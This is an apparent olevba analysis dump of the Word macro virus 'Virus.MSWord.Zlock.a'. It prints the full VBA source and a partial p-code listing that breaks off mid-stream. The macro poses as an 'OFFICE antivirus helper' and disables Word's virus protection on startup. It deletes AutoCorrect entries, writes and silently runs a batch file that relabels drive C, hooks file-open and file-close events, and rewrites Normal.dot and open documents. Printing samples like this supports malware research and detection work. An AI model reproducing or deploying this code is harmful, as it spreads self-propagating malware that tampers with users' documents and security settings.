olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zlock.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zlock.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Dim pus1
Dim dfchk$
Dim button
Dim mo
Dim mon$
Dim moa$

On Error Resume Next



WordBasic.BeginDialog 500, 250, "OFFICE 防毒小幫手"
    WordBasic.PushButton 101, 83, 245, 21, "OFFICE 防毒小幫手啟動中 ", "Push1"
    WordBasic.Picture 11, 10, 480, 220, "Z-Setup", 1, "Picture1"
WordBasic.EndDialog
Dim mydlg As Object: Set mydlg = WordBasic.CurValues.UserDialog
WordBasic.Beep
pus1 = WordBasic.Dialog.UserDialog(mydlg, -1, 500)
    Options.VirusProtection = False
mon$ = NormalTemplate.VBProject.VBComponents.Item(2).CodeModule
If mon$ = "NewMacros" Then mon$ = ""
moa$ = ActiveDocument.VBProject.VBComponents.Item(2).CodeModule
If moa$ = "NewMacros" Then moa$ = ""

mo = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If mo > 0 Or mon$ <> "" Or moa$ <> "" Then
  
    On Error Resume Next
    If Application.Assistant <> "" Then
    With Assistant
    .Visible = True
            
    End With
    End If
    WordBasic.Beep
    button = WordBasic.MsgBox("偵測到 NORMAL.DOT 可能含有巨集病毒，是否要清除掉！", "OFFICE 防毒小幫手警告!", 52)
        If (button = -1) Then
If mon$ <> "" Then Application.OrganizerDelete Source:=Options.DefaultFilePath(wdUserTemplatesPath) + "\normal.dot", _
        Name:=mon$, Object:=wdOrganizerObjectProjectItems

NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, mo
NormalTemplate.Save
WordBasic.Beep
WordBasic.MsgBox "OFFICE 防毒小幫手解毒成功。", "OFFICE 防毒小幫手警告!"
        
        End If
End If

    
done:
   AutoCorrect.Entries(",").Delete
   AutoCorrect.Entries(".").Delete

If Dir("c:", vbVolume) = "GROOVIE" Then

    Open "c:\gg.bat" For Output As 1
    Print #1, "label c: < c:\gg.txt"
    Close 1

    Open "c:\gg.txt" For Output As 1
    Print #1, ""
    Print #1, "y"
    Print #1, ""
    Close 1

Shell ("c:\gg.bat"), 0
'WordBasic.Kill "c:\gg.bat"
'WordBasic.Kill "c:\gg.txt"

End If

WordBasic.Call "Detect"
End Sub

Sub FileNew()
On Error GoTo -1: On Error GoTo done
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileNew(False)
WordBasic.CurValues.FileNew dlg
WordBasic.Dialog.FileNew dlg
WordBasic.FileNew dlg
WordBasic.ToolsUnprotectDocument

done:
On Error GoTo -1: On Error GoTo exit_
exit_:
End Sub

Sub FileClose()
On Error GoTo -1: On Error GoTo done
'WordBasic.DisableAutoMacros
WordBasic.Call "Detect"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileClose(False)
WordBasic.CurValues.FileClose dlg
'WordBasic.Dialog.FileClose dlg
'WordBasic.FileClose dlg

done:
End Sub

Sub DocClose()
On Error GoTo -1: On Error GoTo done
'WordBasic.DisableAutoMacros
WordBasic.Call "Detect"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.DocClose(False)
WordBasic.CurValues.DocClose dlg
'WordBasic.Dialog.DocClose dlg
'WordBasic.DocClose dlg

done:
End Sub

Sub ClosePane()
On Error GoTo -1: On Error GoTo done
'WordBasic.DisableAutoMacros
WordBasic.Call "Detect"
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ClosePane(False)
WordBasic.CurValues.ClosePane dlg

done:
End Sub

'Sub FileExit()
'On Error GoTo -1: On Error GoTo done
'WordBasic.DisableAutoMacros
'WordBasic.Call "Detect"
'Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileExit(False)
'WordBasic.CurValues.FileExit dlg

'done:

'done:
'MsgBox "ok"
'End Sub



'Sub object_Quit()
'    button = WordBasic.MsgBox("偵測到文件為範本文件，有另存新檔的問題，是否要恢復正常？", "OFFICE 防毒小幫手警告!", 52)
'WordBasic.Call "Detect"
'End Sub

Sub FileOpen()
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
On Error GoTo -1: On Error GoTo done
WordBasic.CurValues.FileOpen dlg
WordBasic.Dialog.FileOpen dlg
WordBasic.DisableAutoMacros
WordBasic.FileOpen dlg
WordBasic.Call "Detect"
done:
End Sub


Sub Detect()
ReDim alln__$(100)
ReDim norn__$(100)
ReDim addmacn__$(100)
ReDim vir__$(100)
Dim tpdd
Dim fn$
Dim mo
Dim mac$
Dim nor
Dim ffdlg As Object
Dim ffd
Dim button
Dim dt
Dim dot
Dim prefix$
Dim mydlg As Object
Dim okcancle
Dim togdlg As Object
Dim tog$
Dim fsdlg As Object
Dim opop
Dim zoodlg As Object
Dim vpe
Dim ass$
i = 0
all = 0
k = 0


On Error GoTo -1: On Error GoTo tpd
Dim tpddlg As Object: Set tpddlg = WordBasic.DialogRecord.ToolsProtectDocument(False)
WordBasic.CurValues.ToolsProtectDocument tpddlg

GoTo gwoo

tpd:
If Err.Number = 509 Then
tpdd = 100
Err.Number = 0
End If

gwoo:
On Error GoTo -1: On Error GoTo done
fn$ = WordBasic.[FileName$]()
nor = WordBasic.CountMacros(0)
If nor <> 0 Then
For i = 1 To nor
norn__$(i) = WordBasic.[MacroName$](i, 0)
Next i
End If
On Error Resume Next
mon$ = NormalTemplate.VBProject.VBComponents.Item(2).CodeModule
If mon$ = "NewMacros" Then mon$ = ""
moa$ = ActiveDocument.VBProject.VBComponents.Item(2).CodeModule
If moa$ = "NewMacros" Then moa$ = ""

mo = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If mo > 0 Or mon$ <> "" Or moa$ <> "" Then
    GoTo rechk
    Else
mo = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If mo > 0 Then GoTo rechk
End If
all = WordBasic.CountMacros(1)
If all = 0 Then

Set ffdlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs ffdlg
ffd = ffdlg.Format

On Error Resume Next
If ffd = 1 And UCase(WordBasic.[Right$](fn$, 3)) <> "DOT" Then

If Application.Assistant <> "" Then

With Assistant
    .Visible = True
            
End With

End If

WordBasic.Beep
    button = WordBasic.MsgBox("偵測到文件為範本文件，有另存新檔的問題，是否要恢復正常？", "OFFICE 防毒小幫手警告!", 52)
        If (button = -1) Then GoTo tocln
Else
    If tpdd = 100 And UCase(WordBasic.[Right$](fn$, 3)) = "DOC" Then

If Application.Assistant <> "" Then

With Assistant
    .Visible = True
            
End With

End If
'WordBasic.Beep
 '   button = WordBasic.MsgBox("偵測到文件有密碼保護，是否要消除？", "OFFICE 防毒小幫手警告!", 52)
  '      If (button = -1) Then
   '     WordBasic.FileSaveAs Format:=1
    '    GoTo tocln
     '   End If
    End If
End If
GoTo done                           'if 1
End If                              'end 1

Dim ppdlg As Object: Set ppdlg = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo ppdlg

If UCase(WordBasic.[Right$](ppdlg.Template, 10)) <> "NORMAL.DOT" Then GoTo done


For i = 1 To all
alln__$(i) = WordBasic.[MacroName$](i, 1)
If WordBasic.[MacroName$](i, 1) = "ZlockMacro" Then
    If WordBasic.[MacroDesc$]("ZlockMacro") = "OFFICE 防毒小幫手警告!---ZlockMacro     " Or WordBasic.[MacroDesc$]("ZlockMacro") = "G.Great ZLOCK AV-Macro---ZlockMacro     " Then
        If UCase(WordBasic.[Right$](fn$, 12)) = "Z-MACROC.DOC" Or UCase(WordBasic.[Right$](fn$, 11)) = "Z-MACRO.DOC" Or UCase(WordBasic.[Right$](fn$, 10)) = "Z-SCAN.DOC" Then

WordBasic.ToolsUnprotectDocument
WordBasic.ToolsOptionsView FieldCodes:=0
WordBasic.ToolsProtectDocument DocumentPassword:="", NoReset:=0, Type:=1

If UCase(WordBasic.[Right$](fn$, 12)) = "Z-MACROC.DOC" Then dt = 9
If UCase(WordBasic.[Right$](fn$, 11)) = "Z-MACRO.DOC" Then dt = 8
If UCase(WordBasic.[Right$](fn$, 10)) = "Z-SCAN.DOC" Then dt = 7

dot = InStr(fn$, ".")
If dot > 1 Then prefix$ = WordBasic.[Left$](fn$, dot - dt)
If WordBasic.[Files$](prefix$ + "zlock.com") <> "" Then
GoTo done
Else
WordBasic.Beep
WordBasic.MsgBox "所開啟的 " + fn$ + " 檔案並沒有在 ZLOCK 的正式安裝目錄內，為了避免有問題的版本，請利用原版軟體安裝。", "OFFICE 防毒小幫手警告!"
WordBasic.DocClose 2
GoTo done
End If
        End If
    End If
End If

Next

rechk:

On Error Resume Next
If Application.Assistant <> "" Then
    With Assistant
    .Visible = True
            
    End With
End If
    WordBasic.Beep
    button = WordBasic.MsgBox("偵測到此文件可能含有巨集病毒，是否要清除掉！", "OFFICE 防毒小幫手警告!", 52)
        If (button = -1) Then GoTo tocln
        GoTo done
        
tocln:
If mo > 0 Or mon$ <> "" Or moa$ <> "" Then
On Error Resume Next
If mon$ <> "" Then Application.OrganizerDelete Source:=Options.DefaultFilePath(wdUserTemplatesPath) + "\normal.dot", _
        Name:=mon$, Object:=wdOrganizerObjectProjectItems
If moa$ <> "" Then Application.OrganizerDelete Source:=fn$, _
        Name:=moa$, Object:=wdOrganizerObjectProjectItems
If mo > 0 Then ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, mo
WordBasic.ScreenUpdating 0
ActiveDocument.SaveAs FileFormat:=wdFormatRTF
WordBasic.DocClose 2
WordBasic.FileOpen Name:=fn$
ActiveDocument.SaveAs FileFormat:=wdFormatDocument
WordBasic.ScreenUpdating 1
mo = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, mo

GoTo okk
End If
Set togdlg = WordBasic.DialogRecord.ToolsOptionsGeneral(False)
WordBasic.CurValues.ToolsOptionsGeneral togdlg
If togdlg.RecentFiles = 1 Then
tog$ = togdlg.RecentFileCount
WordBasic.ToolsOptionsGeneral RecentFiles:=0, RecentFileCount:=""
WordBasic.ToolsOptionsGeneral RecentFiles:=1, RecentFileCount:=tog$
End If


opn:
WordBasic.ScreenUpdating 0
On Error GoTo -1: On Error GoTo opn1
Set fsdlg = WordBasic.DialogRecord.FileTemplates(False)
WordBasic.CurValues.FileTemplates fsdlg
opop = 100
opn1:
Set zoodlg = WordBasic.DialogRecord.ViewZoom(False)
WordBasic.CurValues.ViewZoom zoodlg

On Error Resume Next
If WordBasic.ViewNormal() = -1 Then
ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges
WordBasic.FileNew Template:=fn$, NewTemplate:=0
WordBasic.ViewNormal
GoTo full
End If
If WordBasic.ViewPage() = -1 Then
vpe = 100
ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges
WordBasic.FileNew Template:=fn$, NewTemplate:=0
WordBasic.ViewPage
GoTo full
End If
If opop = 0 Then GoTo full
If WordBasic.ViewOutline() = -1 Then
ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges
WordBasic.FileNew Template:=fn$, NewTemplate:=0
WordBasic.ViewOutline
GoTo full
End If
If WordBasic.ViewMasterDocument() = -1 Then
ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges
WordBasic.FileNew Template:=fn$, NewTemplate:=0
WordBasic.ViewMasterDocument
GoTo full
End If

full:

On Error Resume Next
If vpe = 100 Then
WordBasic.ViewZoom AutoFit:=zoodlg.AutoFit, TwoPages:=zoodlg.TwoPages, FullPage:=zoodlg.FullPage, NumColumns:=zoodlg.NumColumns, NumRows:=zoodlg.NumRows, ZoomPercent:=zoodlg.ZoomPercent
vpe = 0
End If
WordBasic.ViewZoom AutoFit:=zoodlg.AutoFit, ZoomPercent:=zoodlg.ZoomPercent


If opop = 100 Then
WordBasic.FileTemplates Store:=fsdlg.Store, Template:=fsdlg.Template, LinkStyles:=fsdlg.LinkStyles

End If
opop = 0

On Error GoTo -1: On Error GoTo nx
If UCase(WordBasic.[Left$](fn$, 1)) = "A" Or UCase(WordBasic.[Left$](fn$, 1)) = "B" Or tpdd = 100 Then
WordBasic.FileSaveAs Name:="c:\ztemp.ztm", Format:=0, AddToMru:=0
Else
WordBasic.FileSaveAs Name:=fn$, Format:=0, AddToMru:=0
GoTo okk
End If

dot = InStr(fn$, ".")
If dot > 1 Then prefix$ = WordBasic.[Left$](fn$, dot - 1)
ActiveWindow.Close SaveChanges:=wdDoNotSaveChanges
If WordBasic.[Left$](WordBasic.[AppInfo$](2), 1) = "6" Then
WordBasic.CopyFile FileName:="c:\ztemp.ztm", Directory:=fn$
GoTo kiii
End If

    Open "c:\test.tst" For Output As 1
    Print #1, "test"
    Close 1

WordBasic.CopyFile FileName:="c:\test.tst", Directory:=fn$
WordBasic.Kill "c:\test.tst"
WordBasic.Kill fn$



WordBasic.CopyFile FileName:="c:\ztemp.ztm", Directory:=fn$
If WordBasic.[Files$](fn$) = "" Then
WordBasic.CopyFile FileName:="c:\ztemp.ztm", Directory:=fn$ + ".doc"
WordBasic.Kill prefix$
End If
kiii:
WordBasic.Kill "c:\ztemp.ztm"
WordBasic.ScreenUpdating 1
WordBasic.FileOpen Name:=fn$

okk:
WordBasic.ScreenUpdating 1
WordBasic.Beep
WordBasic.MsgBox "OFFICE 防毒小幫手解毒成功，並還原文件另存新檔的功能。", "OFFICE 防毒小幫手警告!"

nx:
If Err.Number = 1327 Or Err.Number = 1060 Or Err.Number = 1191 Or Err.Number = 23 Then WordBasic.MsgBox "磁碟為防寫模式或空間不夠或有人正在使用此檔案，所以無法備份或解毒。", "OFFICE 防毒小幫手警告!"
Err.Number = 0


done:
WordBasic.DisableAutoMacros 0

'h = WordBasic.Hour(WordBasic.Now())
'm = WordBasic.Minute(WordBasic.Now()) + 1
's = WordBasic.Second(WordBasic.Now())

'If m > 59 Then
'm = 1
'h = h + 1
'End If
'ttm$ = Str(h) + ":" + Str(m) + ":" + Str(s)
'WordBasic.OnTime ttm$, "Detect"



End Sub






-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Zlock.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 57137 bytes
' Line #0:
' 	FuncDefn (Sub AutoExec())
' Line #1:
' 	Dim 
' 	VarDefn pus1
' Line #2:
' 	Dim 
' 	VarDefn dfchk
' Line #3:
' 	Dim 
' 	VarDefn button
' Line #4:
' 	Dim 
' 	VarDefn mo
' Line #5:
' 	Dim 
' 	VarDefn moa
' Line #6:
' 	Dim 
' 	VarDefn _B_str_mon
' Line #7:
' Line #8:
' 	OnError (Resume Next) 
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' 	LitDI2 0x01F4 
' 	LitDI2 0x00FA 
' 	LitStr 0x0011 "OFFICE 防毒小幫手"
' 	Ld WordBasic 
' 	ArgsMemCall BeginDialog 0x0003 
' Line #13:
' 	LitDI2 0x0065 
' 	LitDI2 0x0053 
' 	LitDI2 0x00F5 
' 	LitDI2 0x0015 
' 	LitStr 0x0018 "OFFICE 防毒小幫手啟動中 "
' 	LitStr 0x0005 "Push1"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #14:
' 	LitDI2 0x000B 
' 	LitDI2 0x000A 
' 	LitDI2 0x01E0 
' 	LitDI2 0x00DC 
' 	LitStr 0x0007 "Z-Setup"
' 	LitDI2 0x0001 
' 	LitStr 0x0008 "Picture1"
' 	Ld WordBasic 
' 	ArgsMemCall Picture 0x0007 
' Line #15:
' 	Ld WordBasic 
' 	ArgsMemCall EndDialog 0x0000 
' Line #16:
' 	Dim 
' 	VarDefn mydlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	MemLd UserDialog 
' 	Set mydlg 
' Line #17:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #18:
' 	Ld mydlg 
' 	LitDI2 0x0001 
' 	UMi 
' 	LitDI2 0x01F4 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemLd UserDialog 0x0003 
' 	St pus1 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #20:
' 	LitDI2 0x0002 
' 	Ld Lines 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	St moa$ 
' Line #21:
' 	Ld moa$ 
' 	LitStr 0x0009 "NewMacros"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St moa$ 
' 	EndIf 
' Line #22:
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	St _B_str_mon$ 
' Line #23:
' 	Ld _B_str_mon$ 
' 	LitStr 0x0009 "NewMacros"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St _B_str_mon$ 
' 	EndIf 
' Line #24:
' Line #25:
' 	LitDI2 0x0001 
' 	Ld Lines 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St mo 
' Line #26:
' 	Ld mo 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld moa$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Or 
' 	Ld _B_str_mon$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #27:
' Line #28:
' 	OnError (Resume Next) 
' Line #29:
' 	Ld Application 
' 	MemLd Assistant 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #30:
' 	StartWithExpr 
' 	Ld Assistant 
' 	With 
' Line #31:
' 	LitVarSpecial (True)
' 	MemStWith Visible 
' Line #32:
' Line #33:
' 	EndWith 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #36:
' 	LitStr 0x0032 "偵測到 NORMAL.DOT 可能含有巨集病毒，是否要清除掉！"
' 	LitStr 0x0016 "OFFICE 防毒小幫手警告!"
' 	LitDI2 0x0034 
' 	Ld WordBasic 
' 	ArgsMemLd MsgBox 0x0003 
' 	St button 
' Line #37:
' 	Ld button 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #38:
' 	LineCont 0x0004 13 00 08 00
' 	Ld moa$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld temp 
' 	Ld Options 
' 	ArgsMemLd wdUserTemplatesPath 0x0001 
' 	LitStr 0x000B "\normal.dot"
' 	Add 
' 	ParamNamed wdOrganizerObjectProjectItems 
' 	Ld moa$ 
' 	ParamNamed New 
' 	Ld tttt 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall Source 0x0003 
' 	EndIf 
' Line #39:
' Line #40:
' 	LitDI2 0x0001 
' 	Ld mo 
' 	LitDI2 0x0001 
' 	Ld Lines 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #41:
' 	Ld Lines 
' 	ArgsMemCall Detect 0x0000 
' Line #42:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #43:
' 	LitStr 0x001B "OFFICE 防毒小幫手解毒成功。"
' 	LitStr 0x0016 "OFFICE 防毒小幫手警告!"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #44:
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	EndIfBlock 
' Line #47:
' Line #48:
' Line #49:
' 	Label done 
' Line #50:
' 	LitStr 0x0001 ","
' 	Ld Entries 
' 	ArgsMemLd Delete 0x0001 
' 	ArgsMemCall SGBOX 0x0000 
' Line #51:
' 	LitStr 0x0001 "."
' 	Ld Entries 
' 	ArgsMemLd Delete 0x0001 
' 	ArgsMemCall SGBOX 0x0000 
' Line #52:
' Line #53:
' 	LitStr 0x0002 "c:"
' 	Ld Shell 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0007 "GROOVIE"
' 	Eq 
' 	IfBlock 
' Line #54:
' Line #55:
' 	LitStr 0x0009 "c:\gg.bat"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "label c: < c:\gg.txt"
' 	PrintItemNL 
' Line #57:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #58:
' Line #59:
' 	LitStr 0x0009 "c:\gg.txt"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #61:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "y"
' 	PrintItemNL 
' Line #62:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #63:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #64:
' Line #65:
' 	LitStr 0x0009 "c:\gg.bat"
' 	Paren 
' 	LitDI2 0x0000 
' 	ArgsCall Label 0x0002 
' Line #66:
' 	QuoteRem 0x0000 0x001A "WordBasic.Kill "c:\gg.bat""
' Line #67:
' 	QuoteRem 0x0000 0x001A "WordBasic.Kill "c:\gg.txt""
' Line #68:
' Line #69:
' 	EndIfBlock 
' Line #70:
' Line #71:
' 	LitStr 0x0006 "Detect"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Sub FileNew())
' Line #75:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError done 
' Line #76:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileNew 0x0001 
' 	Set dlg 
' Line #77:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileNew 0x0001 
' Line #78:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileNew 0x0001 
' Line #79:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileNew 0x0001 
' Line #80:
' 	Ld WordBasic 
' 	ArgsMemCall ToolsUnprotectDocument 0x0000 
' Line #81:
' Line #82:
' 	Label done 
' Line #83:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError exit_ 
' Line #84:
' 	Label exit_ 
' Line #85:
' 	EndSub 
' Line #86:
' Line #87:
' 	FuncDefn (Sub _B_var_Sub())
' Line #88:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError done 
' Line #89:
' 	QuoteRem 0x0000 0x001B "WordBasic.DisableAutoMacros"
' Line #90:
' 	LitStr 0x0006 "Detect"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #91:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd _B_var_Sub 0x0001 
' 	Set dlg 
' Line #92:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall _B_var_Sub 0x0001 
' Line #93:
' 	QuoteRem 0x0000 0x001E "WordBasic.Dialog.FileClose dlg"
' Line #94:
' 	QuoteRem 0x0000 0x0017 "WordBasic.FileClose dlg"
' Line #95:
' Line #96:
' 	Label done 
' Line #97:
' 	EndSub 
' Line #98:
' Line #99:
' 	FuncDefn (Sub DocClose())
' Line #100:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError done 
' Line #101:
' 	QuoteRem 0x0000 0x001B "WordBasic.DisableAutoMacros"
' Line #102:
' 	LitStr 0x0006 "Detect"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #103:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd DocClose 0x0001 
' 	Set dlg 
' Line #104:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall DocClose 0x0001 
' Line #105:
' 	QuoteRem 0x0000 0x001D "WordBasic.Dialog.DocClose dlg"
' Line #106:
' 	QuoteRem 0x0000 0x0016 "WordBasic.DocClose dlg"
' Line #107:
' Line #108:
' 	Label done 
' Line #109:
' 	EndSub 
' Line #110:
' Line #111:
' 	FuncDefn (Sub FileExit())
' Line #112:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError done 
' Line #113:
' 	QuoteRem 0x0000 0x001B "WordBasic.DisableAutoMacros"
' Line #114:
' 	LitStr 0x0006 "Detect"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #115:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileExit 0x0001 
' 	Set dlg 
' Line #116:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileExit 0x0001 
' Line #117:
' Line #118:
' 	Label done 
' Line #119:
' 	EndSub 
' Line #120:
' Line #121:
' 	QuoteRem 0x0000 0x000E "Sub FileExit()"
' Line #122:
' 	QuoteRem 0x0000 0x0024 "On Error GoTo -1: On Error GoTo done"
' Line #123:
' 	QuoteRem 0x0000 0x001B "WordBasic.DisableAutoMacros"
' Line #124:
' 	QuoteRem 0x0000 0x0017 "WordBasic.Call "Detect""
' Line #125:
' 	QuoteRem 0x0000 0x0043 "Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileExit(False)"
' Line #126:
' 	QuoteRem 0x0000 0x0020 "WordBasic.CurValues.FileExit dlg"
' Line #127:
' Line #128:
' 	QuoteRem 0x0000 0x0005 "done:"
' Line #129:
' Line #130:
' 	QuoteRem 0x0000 0x0005 "done:"
' Line #131:
' 	QuoteRem 0x0000 0x000B "MsgBox "ok""
' Line #132:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' 	QuoteRem 0x0000 0x0011 "Sub object_Quit()"
' Line #137:
' 	QuoteRem 0x0000 0x0077 "    button = WordBasic.MsgBox("偵測到文件為範本文件，有另存新檔的問題，是否要恢復正常？", "OFFICE 防毒小幫手警告!", 52)"
' Line #138:
' 	QuoteRem 0x0000 0x0017 "WordBasic.Call "Detect""
' Line #139:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #140:
' Line #141:
' 	FuncDefn (Sub FileOpen())
' Line #142:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileOpen 0x0001 
' 	Set dlg 
' Line #143:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError done 
' Line #144:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileOpen 0x0001 
' Line #145:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileOpen 0x0001 
' Line #146:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #147:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0001 
' Line #148:
' 	LitStr 0x0006 "Detect"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #149:
' 	Label done 
' Line #150:
' 	EndSub 
' Line #151:
' Line #152:
' Line #153:
' 	FuncDefn (Sub priviSub())
' Line #154:
' 	OptionBase 
' 	LitDI2 0x0064 
' 	Redim alln__$ 0x0001 (As String)
' Line #155:
' 	OptionBase 
' 	LitDI2 0x0064 
' 	Redim norn__$ 0x0001 (As String)
' Line #156:
' 	OptionBase 
' 	LitDI2 0x0064 
' 	Redim addmacn__$ 0x0001 (As String)
' Line #157:
' 	OptionBase 
' 	LitDI2 0x0064 
' 	Redim vir__$ 0x0001 (As String)
' Line #158:
' 	Dim 
' 	VarDefn tpdd
' Line #159:
' 	Dim 
' 	VarDefn fn
' Line #160:
' 	Dim 
' 	VarDefn mo
' Line #161:
' 	Dim 
' 	VarDefn mac
' Line #162:
' 	Dim 
' 	VarDefn nor
' Line #163:
' 	Dim 
' 	VarDefn ffdlg (As Object)
' Line #164:
' 	Dim 
' 	VarDefn ffd
' Line #165:
' 	Dim 
' 	VarDefn button
' Line #166:
' 	Dim 
' 	VarDefn dt
' Line #167:
' 	Dim 
' 	VarDefn dot
' Line #168:
' 	Dim 
' 	VarDefn prefix
' Line #169:
' 	Dim 
